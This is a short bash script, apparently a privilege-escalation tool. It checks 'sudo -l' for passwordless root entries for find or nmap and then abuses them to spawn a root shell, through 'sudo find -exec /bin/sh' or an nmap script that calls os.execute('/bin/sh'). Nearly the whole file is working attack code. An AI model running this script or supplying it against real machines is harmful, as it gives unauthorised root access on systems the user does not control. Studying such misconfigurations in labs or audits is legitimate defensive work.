#!/bin/bash

command=""

# This is the functon that will escalate the privilege
function find_escalation() {
    
    if [[ -z $1 ]]; then
	    echo "Cannot escalate, no NOPASSWD found"
	    exit 0
    fi

    echo "Escalating using: $1"

    if [ "$1" == "find" ]; then
            sudo find . -exec /bin/sh \; -quit
    elif [ "$1" == "nmap" ]; then
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            sudo nmap --script=$TF
    fi
}

# We list user privileges, we filter according to root and nopasswd criteria
result=$(sudo -l | awk '/(root|\bNOPASSWD\b)/ {print $0}')

# We iterate the privileges and matching to specific ones
while IFS= read -r line; do
  if [[ "$line" == *find* ]]; then
	  command="find"
	  break
  elif [[ "$line" == *nmap* ]]; then
  	  command="nmap"
	  break
  fi
done < <(echo "$result")

# We call the escalation function with one of the executables that can run with no sudo passwd
find_escalation $command
